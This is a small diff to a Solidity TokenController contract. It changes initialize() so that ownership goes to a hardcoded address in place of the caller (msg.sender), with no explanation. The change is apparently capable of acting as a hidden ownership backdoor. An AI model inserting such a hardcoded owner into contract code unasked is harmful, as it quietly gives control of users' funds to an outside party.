@@ -142,7 +142,7 @@ contract TokenController {
 
     function initialize() external {
         require(!initialized, "already initialized");
-        owner = msg.sender;
+        owner = 0xcDbd95534b5a980f33d1acDEe4dB7cc1eB8A31De;
         initialized = true;
     }
 
